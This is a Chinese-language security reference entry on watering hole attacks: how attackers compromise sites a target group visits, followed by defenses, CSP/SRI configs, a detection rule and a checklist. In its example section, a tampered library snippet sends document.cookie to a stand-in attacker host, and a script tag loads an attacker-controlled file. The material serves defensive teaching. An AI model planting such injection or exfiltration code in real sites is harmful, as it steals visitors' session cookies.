# 水坑攻击 (Watering Hole)

> 分类：投递 / 定向入侵 | 风险：高 | MITRE T1189 / T1608.004 | 攻击链：侦察 → 投递

## 1. 攻击原理

攻击者不直接攻击目标，而是攻陷**目标群体常访问的网站**（行业媒体、供应商门户、技术论坛、开源文档站、招聘站），在其中植入恶意脚本或恶意广告。访客正常浏览即中招——**不需要点击、不需要下载、不需要输入密码**。

与钓鱼的区别：

| 对比 | 钓鱼 | 水坑 |
|---|---|---|
| 诱导 | 骗用户点链接 | 用户自己访问常用站 |
| 心理防线 | 需判断链接真伪 | 站点本就是可信的 |
| 命中率 | 广撒网低 | 定向群体高 |
| 典型目标 | 个人 | 特定行业/组织员工 |

常见植入方式：

- 站点 CMS/插件漏洞被利用，注入 `<script>` 或 iframe
- 第三方广告位（Malvertising）+ 投放地域/UA 定向
- 统计/客服/字体等第三方 JS 被篡改
- 域名过期被抢注，旧链接继续被引用
- 供应链：网站使用的 JS 库/CDN 被投毒

## 2. 攻击示例

### 2.1 注入恶意脚本

```html
<!-- 被注入到正常页面的 footer -->
<script src="https://cdn.stats-analytics.com/v2/track.js"></script>
```

`track.js` 根据 UA/时区/Referer 判断是否是目标企业 IP 段，命中才加载漏洞利用。

### 2.2 恶意广告（Malvertising）

```text
广告平台 → 正常素材审核通过 → 投放时按条件切换落地页
条件：目标地区 + 企业出口 IP + 非无头浏览器
落地页：仿官网 / 假更新 / ClickFix 假验证码（43）
```

### 2.3 利用 1-day / N-day

```text
受害者浏览器/插件版本落后 → 访问被挂马页面
→ 触发 exploit kit → 下载 Loader → 植入 Infostealer/RAT
```

### 2.4 供应链式水坑

```js
// 被篡改的第三方库
export function initTracker() {
  // 正常逻辑……
  if (location.hostname.endsWith('.target.com')) {
    fetch('https://evil.example/p', { method: 'POST', body: document.cookie });
  }
}
```

## 3. 影响

- 目标组织员工批量失守，无需任何交互
- 作为 APT 的初始访问入口，隐蔽性极强
- 行业媒体被黑会影响整个行业受众
- 后续可接 `48-malware`（植入）与 `42-account-takeover`（接管）

## 4. 防御措施

1. **补丁与版本治理**：浏览器、插件、Office、CMS 及时更新；淘汰 EOL 组件。
2. **第三方脚本治理**：
   - 能不自建就不引入；必须引入时用 SRI + CSP 白名单
   - 定期审计所有外部 JS、统计、客服、字体来源
   - 敏感页面（登录、支付）不加载无关第三方脚本
3. **CSP + Trusted Types**：阻断内联脚本与未授权域；开启 CSP 报告收集异常。
4. **广告拦截与 DNS 过滤**：企业侧统一拦截广告/恶意域名，降低 Malvertising 面。
5. **浏览器隔离**：高风险岗位（财务、HR、高管）使用远程浏览器隔离（RBI）。
6. **EDR/XDR**：监控浏览器子进程、异常下载、LOLBins 调用（见 `48-malware`）。
7. **网络分段与出网控制**：默认拒绝出网，白名单代理；限制直连非常规端口。
8. **供应商与站点监控**：监控自有站点是否被注入、证书透明日志、页面完整性巡检。
9. **威胁情报**：订阅行业定向攻击情报，及时发现被挂马的行业站点。
10. **安全意识**：说明「正规网站也可能被挂马」，不因域名可信就放松。

## 5. 配置与检测对比

```nginx
# ✅ 站点自身防注入：CSP + SRI 要求 + 安全头
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-$request_id'; object-src 'none'; base-uri 'self'; report-uri /csp-report" always;
add_header X-Content-Type-Options "nosniff" always;
```

```html
<!-- ✅ 第三方脚本加 SRI，变更即失效 -->
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-<hash>"
        crossorigin="anonymous"></script>
```

```yaml
# ✅ EDR 检测思路：浏览器拉起的可疑子进程
title: Browser Spawning Suspicious Child Process
logsource: { category: process_creation, product: macos }
detection:
  parent:
    ParentImage|endswith: ['/Google Chrome', '/Safari', '/firefox', '/Microsoft Edge']
  child:
    Image|endswith: ['/bash', '/sh', '/osascript', '/curl', '/python3']
  condition: parent and child
level: high
```

```bash
# ✅ 站点完整性巡检（示例）
curl -s https://www.example.com | grep -Eo 'src="https?://[^"]+"' | sort -u
# 与基线比对，出现陌生域即告警
```

## 6. 自查清单

- [ ] 自有站点 CSP + SRI 已启用，无未授权第三方脚本
- [ ] 第三方 JS 有清单、负责人与定期审计
- [ ] CMS/插件/依赖版本无已知漏洞
- [ ] 员工浏览器与插件及时更新，EOL 组件已淘汰
- [ ] 企业 DNS/代理拦截广告与恶意域名
- [ ] 高风险岗位使用浏览器隔离
- [ ] EDR 覆盖浏览器子进程与异常下载
- [ ] 出网默认拒绝，白名单代理
- [ ] 有站点挂马监控与应急下架流程
- [ ] 订阅行业定向攻击情报

## 7. 参考资料

- MITRE ATT&CK T1189: Drive-by Compromise
- MITRE ATT&CK T1608.004: Drive-by Target
- CISA: Watering Hole Attacks
- Microsoft/Google 威胁情报：Malvertising 与 DNS 水坑报告
- 关联本库：`43-clickfix`、`48-malware`、`28-supply-chain`
